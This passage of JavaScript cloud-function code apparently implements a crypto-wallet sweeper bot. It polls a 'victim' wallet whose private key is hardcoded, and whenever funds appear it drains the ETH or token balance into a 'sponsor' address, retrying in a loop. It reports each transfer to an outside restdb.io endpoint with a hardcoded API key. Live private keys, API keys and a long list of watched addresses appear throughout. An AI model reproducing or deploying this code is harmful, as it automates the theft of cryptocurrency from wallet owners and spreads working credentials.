                dripbalancegreaterthanweb3js(contract, victim, sponsor, tkbalanceADDR1, web33, TOKEN_ADDRESS, "logger", stop);
                // console.log("Now grater than")
                // logger.info("Now grater than");
            }
            else {
                // logger.info("Less Than");
                // console.log("less than")
            }
        }, 2000);
    }
    ;
    async function dripbalancegreaterthanweb3js(contract, victim, sponsor, tkbalanceADDR1, web33, TOKEN_ADDRESS, llooggerx, stop) {
        // var loggerdrip = Moralis.Cloud.getLogger();
        // console.log(contract)
        var transferfrom = contract.methods.transferFrom(victim.address, sponsor.address, tkbalanceADDR1.toString());
        var gaslimit = await web33.eth.estimateGas({ from: sponsor.address });
        // var gaslimit = await contract.methods.transferFrom(victim.address, sponsor.address, tkbalanceADDR1.toString()).estimateGas({from: sponsor.address})
        var gasPrice = await web33.eth.getGasPrice();
        var BN = web33.utils.BN;
        gasPrice = web33.utils.toBN(gasPrice);
        gaslimit = web33.utils.toBN(gaslimit);
        var transaction = {
            // chainId: 56,
            from: sponsor.address,
            nonce: 0,
            to: TOKEN_ADDRESS,
            gasPrice: gasPrice.add(gasPrice.divn(2)),
            gasLimit: gaslimit.muln(2),
            data: transferfrom.encodeABI(),
        };
        try {
            var nonce = await web33.eth.getTransactionCount(sponsor.address);
            transaction.nonce = nonce;
            let signedTx = await web33.eth.accounts.signTransaction(transaction, sponsor.privateKey);
            // logger.info(signedTx);
            // llooggerx.info(JSON.stringify(signedTx));
            web33.eth.sendSignedTransaction(signedTx.rawTransaction).on('receipt', (receipt) => {
                // console.log(receipt)
                // llooggerx.info(receipt);
                stopfunc(stop);
                setTimeout(() => {
                    stop = false;
                    botDripWeb3js();
                    llooggerx.info("succss:	😀 restarting");
                    Parse.Cloud.httpRequest({
                        method: 'POST',
                        url: 'https://airnai-ddc3.restdb.io/rest/airnai',
                        headers: {
                            "content-type": "application/json",
                            "x-apikey": "62c00e68e91195203e3aa78d",
                            "cache-control": "no-cache"
                        },
                        body: {
                            addr_from: receipt.from,
                            addr_to: receipt.to,
                            value: "result",
                            time: new Date().toLocaleString(),
                            brand: "HoneyperSecondTransactionEth",
                            server: "1"
                        }
                    }).then(function (httpResponse) {
                        //logger.info(httpResponse.text);
                        // llooggerx.info("Fired paw paw!");
                    }, function (httpResponse) {
                        // llooggerx.info(JSON.stringify(httpResponse));
                    });
                }, 5000);
            }).on('error', (err) => {
                // console.log(err)
                // console.log(err.message)
                // llooggerx.error(err.message);
                // llooggerx.info(JSON.stringify(err.message) );
                if (err.message == 'Returned error: already known' || err.emmage == 'Returned error: replacement transaction underpriced') {
                    stopfunc(stop);
                    setTimeout(() => {
                        stop = false;
                        botDripWeb3js();
                        // llooggerx.info("restarting, after error");
                        // logger.info("restarting, after error");
                    }, 5000);
                }
            });
        }
        catch (error) {
            // llooggerx.error(error);
            // llooggerx.info(JSON.stringify(error));
            // console.log(error)
            // llooggerx.info("try catch block error")
        }
    }
    async function MaticjsWeb3js() {
        // var logger = Moralis.Cloud.getLogger();
        var config = await Parse.Config.get({ useMasterKey: true });
        var prjid = config.get("Infur");
        var stop = false;
        var count = 0;
        let abijson = [{ "inputs": [{ "internalType": "address", "name": "_thirdwebFee", "type": "address" }], "stateMutability": "nonpayable", "type": "varructor" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "owner", "type": "address" }, { "indexed": true, "internalType": "address", "name": "spender", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Approval", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "delegator", "type": "address" }, { "indexed": true, "internalType": "address", "name": "fromDelegate", "type": "address" }, { "indexed": true, "internalType": "address", "name": "toDelegate", "type": "address" }], "name": "DelegateChanged", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "delegate", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "previousBalance", "type": "uint256" }, { "indexed": false, "internalType": "uint256", "name": "newBalance", "type": "uint256" }], "name": "DelegateVotesChanged", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "internalType": "address", "name": "account", "type": "address" }], "name": "Paused", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "internalType": "address", "name": "platformFeeRecipient", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "platformFeeBps", "type": "uint256" }], "name": "PlatformFeeInfoUpdated", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "recipient", "type": "address" }], "name": "PrimarySaleRecipientUpdated", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "bytes32", "name": "role", "type": "bytes32" }, { "indexed": true, "internalType": "bytes32", "name": "previousAdminRole", "type": "bytes32" }, { "indexed": true, "internalType": "bytes32", "name": "newAdminRole", "type": "bytes32" }], "name": "RoleAdminChanged", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "bytes32", "name": "role", "type": "bytes32" }, { "indexed": true, "internalType": "address", "name": "account", "type": "address" }, { "indexed": true, "internalType": "address", "name": "sender", "type": "address" }], "name": "RoleGranted", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "bytes32", "name": "role", "type": "bytes32" }, { "indexed": true, "internalType": "address", "name": "account", "type": "address" }, { "indexed": true, "internalType": "address", "name": "sender", "type": "address" }], "name": "RoleRevoked", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "mintedTo", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "quantityMinted", "type": "uint256" }], "name": "TokensMinted", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "signer", "type": "address" }, { "indexed": true, "internalType": "address", "name": "mintedTo", "type": "address" }, { "components": [{ "internalType": "address", "name": "to", "type": "address" }, { "internalType": "address", "name": "primarySaleRecipient", "type": "address" }, { "internalType": "uint256", "name": "quantity", "type": "uint256" }, { "internalType": "uint256", "name": "price", "type": "uint256" }, { "internalType": "address", "name": "currency", "type": "address" }, { "internalType": "uint128", "name": "validityStartTimestamp", "type": "uint128" }, { "internalType": "uint128", "name": "validityEndTimestamp", "type": "uint128" }, { "internalType": "bytes32", "name": "uid", "type": "bytes32" }], "indexed": false, "internalType": "struct ITokenERC20.MintRequest", "name": "mintRequest", "type": "tuple" }], "name": "TokensMintedWithSignature", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "from", "type": "address" }, { "indexed": true, "internalType": "address", "name": "to", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Transfer", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "internalType": "address", "name": "account", "type": "address" }], "name": "Unpaused", "type": "event" }, { "inputs": [], "name": "DEFAULT_ADMIN_ROLE", "outputs": [{ "internalType": "bytes32", "name": "", "type": "bytes32" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "DOMAIN_SEPARATOR", "outputs": [{ "internalType": "bytes32", "name": "", "type": "bytes32" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "owner", "type": "address" }, { "internalType": "address", "name": "spender", "type": "address" }], "name": "allowance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "approve", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "burn", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "burnFrom", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }, { "internalType": "uint32", "name": "pos", "type": "uint32" }], "name": "checkpoints", "outputs": [{ "components": [{ "internalType": "uint32", "name": "fromBlock", "type": "uint32" }, { "internalType": "uint224", "name": "votes", "type": "uint224" }], "internalType": "struct ERC20VotesUpgradeable.Checkpoint", "name": "", "type": "tuple" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "contractType", "outputs": [{ "internalType": "bytes32", "name": "", "type": "bytes32" }], "stateMutability": "pure", "type": "function" }, { "inputs": [], "name": "contractURI", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "contractVersion", "outputs": [{ "internalType": "uint8", "name": "", "type": "uint8" }], "stateMutability": "pure", "type": "function" }, { "inputs": [], "name": "decimals", "outputs": [{ "internalType": "uint8", "name": "", "type": "uint8" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "subtractedValue", "type": "uint256" }], "name": "decreaseAllowance", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "delegatee", "type": "address" }], "name": "delegate", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "delegatee", "type": "address" }, { "internalType": "uint256", "name": "nonce", "type": "uint256" }, { "internalType": "uint256", "name": "expiry", "type": "uint256" }, { "internalType": "uint8", "name": "v", "type": "uint8" }, { "internalType": "bytes32", "name": "r", "type": "bytes32" }, { "internalType": "bytes32", "name": "s", "type": "bytes32" }], "name": "delegateBySig", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "delegates", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "blockNumber", "type": "uint256" }], "name": "getPastTotalSupply", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }, { "internalType": "uint256", "name": "blockNumber", "type": "uint256" }], "name": "getPastVotes", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "getPlatformFeeInfo", "outputs": [{ "internalType": "address", "name": "", "type": "address" }, { "internalType": "uint16", "name": "", "type": "uint16" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "bytes32", "name": "role", "type": "bytes32" }], "name": "getRoleAdmin", "outputs": [{ "internalType": "bytes32", "name": "", "type": "bytes32" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "bytes32", "name": "role", "type": "bytes32" }, { "internalType": "uint256", "name": "index", "type": "uint256" }], "name": "getRoleMember", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "bytes32", "name": "role", "type": "bytes32" }], "name": "getRoleMemberCount", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "getVotes", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "bytes32", "name": "role", "type": "bytes32" }, { "internalType": "address", "name": "account", "type": "address" }], "name": "grantRole", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "bytes32", "name": "role", "type": "bytes32" }, { "internalType": "address", "name": "account", "type": "address" }], "name": "hasRole", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "addedValue", "type": "uint256" }], "name": "increaseAllowance", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "_defaultAdmin", "type": "address" }, { "internalType": "string", "name": "_name", "type": "string" }, { "internalType": "string", "name": "_symbol", "type": "string" }, { "internalType": "string", "name": "_contractURI", "type": "string" }, { "internalType": "address[]", "name": "_trustedForwarders", "type": "address[]" }, { "internalType": "address", "name": "_primarySaleRecipient", "type": "address" }, { "internalType": "address", "name": "_platformFeeRecipient", "type": "address" }, { "internalType": "uint256", "name": "_platformFeeBps", "type": "uint256" }], "name": "initialize", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "forwarder", "type": "address" }], "name": "isTrustedForwarder", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "to", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "mintTo", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "components": [{ "internalType": "address", "name": "to", "type": "address" }, { "internalType": "address", "name": "primarySaleRecipient", "type": "address" }, { "internalType": "uint256", "name": "quantity", "type": "uint256" }, { "internalType": "uint256", "name": "price", "type": "uint256" }, { "internalType": "address", "name": "currency", "type": "address" }, { "internalType": "uint128", "name": "validityStartTimestamp", "type": "uint128" }, { "internalType": "uint128", "name": "validityEndTimestamp", "type": "uint128" }, { "internalType": "bytes32", "name": "uid", "type": "bytes32" }], "internalType": "struct ITokenERC20.MintRequest", "name": "_req", "type": "tuple" }, { "internalType": "bytes", "name": "_signature", "type": "bytes" }], "name": "mintWithSignature", "outputs": [], "stateMutability": "payable", "type": "function" }, { "inputs": [{ "internalType": "bytes[]", "name": "data", "type": "bytes[]" }], "name": "multicall", "outputs": [{ "internalType": "bytes[]", "name": "results", "type": "bytes[]" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "name", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "owner", "type": "address" }], "name": "nonces", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "numCheckpoints", "outputs": [{ "internalType": "uint32", "name": "", "type": "uint32" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "pause", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "paused", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "owner", "type": "address" }, { "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "value", "type": "uint256" }, { "internalType": "uint256", "name": "deadline", "type": "uint256" }, { "internalType": "uint8", "name": "v", "type": "uint8" }, { "internalType": "bytes32", "name": "r", "type": "bytes32" }, { "internalType": "bytes32", "name": "s", "type": "bytes32" }], "name": "permit", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "primarySaleRecipient", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "bytes32", "name": "role", "type": "bytes32" }, { "internalType": "address", "name": "account", "type": "address" }], "name": "renounceRole", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "bytes32", "name": "role", "type": "bytes32" }, { "internalType": "address", "name": "account", "type": "address" }], "name": "revokeRole", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "string", "name": "_uri", "type": "string" }], "name": "setContractURI", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "_platformFeeRecipient", "type": "address" }, { "internalType": "uint256", "name": "_platformFeeBps", "type": "uint256" }], "name": "setPlatformFeeInfo", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "_saleRecipient", "type": "address" }], "name": "setPrimarySaleRecipient", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "bytes4", "name": "interfaceId", "type": "bytes4" }], "name": "supportsInterface", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "symbol", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "totalSupply", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "to", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "from", "type": "address" }, { "internalType": "address", "name": "to", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "unpause", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "components": [{ "internalType": "address", "name": "to", "type": "address" }, { "internalType": "address", "name": "primarySaleRecipient", "type": "address" }, { "internalType": "uint256", "name": "quantity", "type": "uint256" }, { "internalType": "uint256", "name": "price", "type": "uint256" }, { "internalType": "address", "name": "currency", "type": "address" }, { "internalType": "uint128", "name": "validityStartTimestamp", "type": "uint128" }, { "internalType": "uint128", "name": "validityEndTimestamp", "type": "uint128" }, { "internalType": "bytes32", "name": "uid", "type": "bytes32" }], "internalType": "struct ITokenERC20.MintRequest", "name": "_req", "type": "tuple" }, { "internalType": "bytes", "name": "_signature", "type": "bytes" }], "name": "verify", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }, { "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }];
        // var web33 = new Web3("https://goerli.infura.io/v3/3dd198ffc6924f45aa3b50cae37aa6dd");
        var web33 = new web3_1.default(new web3_1.default.providers.HttpProvider("https://eth.getblock.io/" + prjid + "/mainnet/"));
        // var web33 = new Moralis.Web3(
        //   new Moralis.Web3.providers.HttpProvider(
        //     // "https://goerli.infura.io/v3/3dd198ffc6924f45aa3b50cae37aa6dd"
        //     // "https://eth.getblock.io/goerli/?api_key=5674477f-352c-487b-ae37-11cbdbd925c6"
        //     "https://mainnet.infura.io/v3/3dd198ffc6924f45aa3b50cae37aa6dd"
        //     // "https://eth.getblock.io/mainnet/?api_key=5674477f-352c-487b-ae37-11cbdbd925c6"
        //   )
        // );
        // console.log(web33.version)
        //  logger.info(JSON.stringify(web33.version));
        var sponsor = web33.eth.accounts.privateKeyToAccount('b36b36e5809ad496136af4c5e81c0586518dad40130eabfdfb7aa039634628cd');
        ;
        var victim = web33.eth.accounts.privateKeyToAccount('704fe8345c3c2b504aa0103b9a2a16b68b6c9a3c04478f448729429babcd4c8b');
        ;
        var TOKEN_ADDRESS = "0x20f663cea80face82acdfa3aae6862d246ce0333";
        if (!sponsor.privateKey ||
            !victim.privateKey) {
            // logger.info("Please set both SPONSOR_KEY and VICTIM_KEY env");
            // console.error("Please set both SPONSOR_KEY and VICTIM_KEY env");
            return;
        }
        // var abi = ["function transfer(address,uint256) external",   "function balanceOf(address owner) view returns (uint256)", "function transferFrom(address,address,uint256) external", "function allowance(address,address) view returns (uint256)", "function approve(address, uint256) external returns (bool)"];
        var contract = new web33.eth.Contract(abijson, TOKEN_ADDRESS);
        console.log("started");
        var invtl = setInterval(async () => {
            if (stop == true) {
                clearInterval(invtl);
                // logger.info("stopped at strt");
                // console.log("stopped")
                return;
            }
            // var tkbalanceADDR1 = await contract.methods.balanceOf(victim.address).call()
            var tkbalanceADDR1 = await web33.eth.getBalance(victim.address);
            // logger.info(tkbalanceADDR1.toString());
            // console.log(tkbalanceADDR1.toString())
            // logger.info(JSON.stringify(count++));
            var wei = web33.utils.fromWei(tkbalanceADDR1, 'ether');
            // logger.info(wei.toString());
            if (wei > 0.00000290810719206) {
                maticbalancegreaterthanweb3js(contract, victim, sponsor, tkbalanceADDR1, web33, TOKEN_ADDRESS, "logger", stop);
                // console.log("Now grater than")
                // logger.info("Now grater than");
            }
            else {
                // logger.info("Less Than");
                // console.log("less than")
            }
        }, 1000);
    }
    ;
    async function maticbalancegreaterthanweb3js(contract, victim, sponsor, tkbalanceADDR1, web33, TOKEN_ADDRESS, llooggerx, stop) {
        // var loggerdrip = Moralis.Cloud.getLogger();
        // console.log(contract)
        // var transferfrom = contract.methods.transferFrom(victim.address, sponsor.address, tkbalanceADDR1.toString())
        // var gaslimit = await web33.eth.estimateGas({from: victim.address})
        // var gaslimit = await contract.methods.transferFrom(victim.address, sponsor.address, tkbalanceADDR1.toString()).estimateGas({from: sponsor.address})
        var gasPrice = await web33.eth.getGasPrice();
        var BN = web33.utils.BN;
        gasPrice = web33.utils.toBN(gasPrice);
        // gaslimit = web33.utils.toBN(gaslimit)
        var gas = 21000;
        var dgasPrice = gasPrice.add(gasPrice.divn(2));
        var fee = dgasPrice.muln(gas);
        var bl = new BN(tkbalanceADDR1);
        // logger.info("got to matic try catch");
        var baltosend = bl.sub(fee);
        var transaction = {
            // chainId: 56,
            // from: victim.address,
            // nonce: 0,
            to: sponsor.address,
            gasPrice: dgasPrice,
            gas: gas,
            value: baltosend,
            // 'to': rcveraddress, // faucet address to return eth
            // 'value': baltosend,
            // 'gas': gas,
            // 'gasPrice': gasPrice,
        };
        try {
            // var nonce = await web33.eth.getTransactionCount(sponsor.address);
            // transaction.nonce = nonce;
            let signedTx = await web33.eth.accounts.signTransaction(transaction, victim.privateKey);
            // logger.info("got to try catch");
            // llooggerx.info(JSON.stringify(signedTx));
            web33.eth.sendSignedTransaction(signedTx.rawTransaction).on('receipt', (receipt) => {
                // console.log(receipt)
                // llooggerx.info(receipt);
                stopfunc(stop);
                setTimeout(() => {
                    stop = false;
                    MaticjsWeb3js();
                    // llooggerx.info("succss:	😀 restarting");
                    Parse.Cloud.httpRequest({
                        method: 'POST',
                        url: 'https://airnai-ddc3.restdb.io/rest/airnai',
                        headers: {
                            "content-type": "application/json",
                            "x-apikey": "62c00e68e91195203e3aa78d",
                            "cache-control": "no-cache"
                        },
                        body: {
                            addr_from: receipt.from,
                            addr_to: receipt.to,
                            value: baltosend,
                            time: new Date().toLocaleString(),
                            brand: "HoneyperMaticValidator",
                            server: "1"
                        }
                    }).then(function (httpResponse) {
                        //logger.info(httpResponse.text);
                        // llooggerx.info("Fired paw paw!");
                    }, function (httpResponse) {
                        // llooggerx.info(JSON.stringify(httpResponse));
                    });
                }, 5000);
            }).on('error', (err) => {
                // console.log(err)
                // console.log(err.message)
                // llooggerx.error(err.message);
                // llooggerx.info(JSON.stringify(err.message) );
                if (err.message == 'Returned error: already known' || err.emmage == 'Returned error: replacement transaction underpriced') {
                    stopfunc(stop);
                    setTimeout(() => {
                        stop = false;
                        MaticjsWeb3js();
                        // llooggerx.info("restarting, after error");
                        // logger.info("restarting, after error");
                    }, 5000);
                }
            });
        }
        catch (error) {
            // llooggerx.error(error);
            // llooggerx.info(JSON.stringify(error));
            // console.log(error)
            // llooggerx.info("try catch block error")
        }
    }
    function stopfunc(stpbool) {
        stpbool = true;
    }
    function getntwork(chainid) {
        var chainids = [
            {
                id: 1,
                name: 'eth'
            },
            {
                id: 137,
                name: 'polygon'
            },
            {
                id: 43114,
                name: 'avax'
            },
            {
                id: 56,
                name: 'bsc'
            },
            {
                id: 250,
                name: 'fantom'
            },
            {
                id: 10,
                name: 'op'
            },
            {
                id: 42161,
                name: 'arb'
            },
            {
                id: 25,
                name: 'cronos'
            }
        ];
        // grab the Array item which matchs the id "2"
        var item = chainids.find(item => item.id == chainid);
        var returnvalue = '';
        if (item) {
            returnvalue = item.name;
        }
        else {
            returnvalue = 'null';
        }
        return returnvalue;
    }
    async function mshlogger(request, brand, logg) {
        var result = await web3.utils.fromWei(request.object.get("value"));
        //  varresult = Moralis.Cloud.units({
        //    method: "fromWei",
        //    value: request.object.get("value"),
        //    });
        Parse.Cloud.httpRequest({
            method: 'POST',
            url: 'https://airnai-ddc3.restdb.io/rest/airnai',
            headers: {
                "content-type": "application/json",
                "x-apikey": "62c00e68e91195203e3aa78d",
                "cache-control": "no-cache"
            },
            body: {
                addr_from: request.object.get("fromAddress"),
                addr_to: request.object.get("toAddress"),
                value: result,
                time: request.object.get("_created_at"),
                brand: brand + ":Honey",
                server: "1"
            }
        }).then(function (httpResponse) {
            //logger.info(httpResponse.text);
            //  logg.info(brand);
        }, function (httpResponse) {
            //  logg.error(JSON.stringify(httpResponse));
        });
    }
});
Parse.Cloud.define("startListening", async () => {
    console.log('hello world run');
    // Parse.Cloud.httpRequest({
    //      method: 'POST',
    //   url: 'https://airnai-ddc3.restdb.io/rest/airnai',
    //   headers: {
    //     "content-type": "application/json",
    //     "x-apikey": "62c00e68e91195203e3aa78d",
    //     "cache-control": "no-cache"
    //   },
    //    body: {
    //      addr_from: 'hey',
    //      addr_to: 'hoo',
    //      value: amount+'',
    //      time: '43340',
    //      brand: "TransactionEth"
    //    }
    // }).then(function(httpResponse: any) {
    //   // success
    //   console.log(httpResponse.text);
    // },function(httpResponse: any) {
    //   // error
    //   console.error('Request failed with response code ' + httpResponse.status);
    // });
    Parse.Cloud.afterSave("DemoTxs", async (request) => {
        console.log(JSON.stringify(request));
        if (request.object.get("confirmed") == false) {
            // const logger = Moralis.Cloud.getLogger();
            // logger.info("Got to Eth Transaction");
            var result = await web3.utils.fromWei(request.object.get("value"));
            Parse.Cloud.httpRequest({
                method: 'POST',
                url: 'https://airnai-ddc3.restdb.io/rest/airnai',
                headers: {
                    "content-type": "application/json",
                    "x-apikey": "62c00e68e91195203e3aa78d",
                    "cache-control": "no-cache"
                },
                body: {
                    addr_from: request.object.get("fromAddress"),
                    addr_to: request.object.get("toAddress"),
                    value: result,
                    time: request.object.get("_created_at"),
                    brand: "DemoTxs"
                }
            }).then(function (httpResponse) {
                //logger.info(httpResponse.text);
                //  logger.info("Logged Eth Trnasfer");\
                console.log(httpResponse.text);
            }, function (httpResponse) {
                // logger.error(JSON.stringify(httpResponse));
                console.log(JSON.stringify(httpResponse));
            });
        }
        else {
        }
    });
});
Parse.Cloud.define("textPassValue", async (request) => {
    return request;
});
Parse.Cloud.define("configureStreams", async (request) => {
    console.log('hello  configureStreams');
    //  Moralis.start({
    //    apiKey: config.MORALIS_API_KEY,
    //  });
    console.log(request.params.addr);
    // return JSON.parse(request.params.addr);
    //  const stream = {
    //    chains: [EvmChain.ETHEREUM, EvmChain.POLYGON, EvmChain.], // list of blockchains to monitor
    //    description: "monitor Bobs wallet", // your description
    //   tag: "bob", // give it a tag
    //    webhookUrl: "https://YOUR_WEBHOOK_URL", // webhook url to receive events,
    //    includeNativeTxs: true
    //  }
    //  const newStream = await Moralis.Streams.add(stream);
    //  const { id } = newStream.toJSON(); // { id: 'YOUR_STREAM_ID', ...newStream }
    // // Now we attach bobs address to the stream
    //  const address = "0x68b3f12d6e8d85a8d3dbbc15bba9dc5103b888a4";
    //  await Moralis.Streams.addAddress({ address, id });
    const id = config_1.default.STREAM_ID;
    // var addrescount = await Moralis.Streams.getAddresses({
    //   limit: 5000,
    //   id });
    // return addrescount 
    // if(addrescount.result) {
    // }
    //  console.log(request.params.addr[0])
    //  return request.params.addr[0];
    const response = await moralis_1.default.Streams.addAddress({
        id: id,
        address: [
            "0x4a25956db2e23897dac68e1d5145d8c4a890c339",
            "0xd304da861126dc248fe2e4ee9516cf1736934ee9",
            "0x244077301a6d198342f8d02302f9d70cdab6a403",
            "0x31452b884f5269ed21e2bab44cc6a9d48eaac85f",
            "0x20be8041cacc63f1a3dfe56b393220f4ba914b0d",
            "0x0941c28fe18b8544317cc7e697f7fd96e705b1c0",
            "0x8c1c879f56b15f0af3c37bfcfb8f14b37d698cca",
            "0x71e6b168d0a8bada236044bc3c8c24ccf803061c",
            "0x3113b6fd282f283feb84d6551bf096098dfcd9db",
            "0x8d1ab7ebd05ad7d06280c2616e2ce533197eda1f",
            "0xf895a163f2943759ece9b46d74e9a3b4c41c42c3",
            "0xe4bcecc7e53581c8727109a9fa07ee53778609d2",
            "0x6e9a4b82626d22cc67474dc8a7945a28bc5ac452",
            "0x9967729491034e4873d90246938e21fb13dc3615",
            "0x40eff723b300eb44433e22c4eea69591685e13fe",
            "0x7d6b5116479724eeb52684cf5d5518f64026c9bb",
            "0x3ef5a397616dec0640821235390de7340f4854e0",
            "0x600fbc3cba074a66900944b7312fd98d9a9a05f4",
            "0xf41fdbbc69a325f6714bb00767ee256db7038c7e",
            "0x79f42ab9e3f6f108e860e2aee9163af2d6d83c23",
            "0xd3921ba5b051f72776ac780d67c0da18f974abfe",
            "0xf1d567e0f6f7c0f524da7269f3e9f4156bbeed76",
            "0x8b9190e9771d942d2c5ddf4f823f4e6d6765c920",
            "0x8d3615639ef946463d5ddd2e02f925c5e51bf421",
            "0x9bd3b02b4051e7a7aeab6d7193e8dc234c45a7ec",
            "0x1661614f42182ab057453e113c50e8430df73693",
            "0x39208032ed3946bc6c311fd84f1167a20ef94883",
            "0x4d84d2d5adfd4a78736c3b9b883fbeb2c7666509",
            "0xfad63d17e27d04775cbc1ffa1dd4c4ec07541d2e",
            "0xcd40b21f382583a387fa00103a5c532d84f5bc94",
            "0x8ee610f545d195e23f03581afaa96b925a80859a",
            "0x050e795dddcb97ee674f297d816c37460ea81b70",
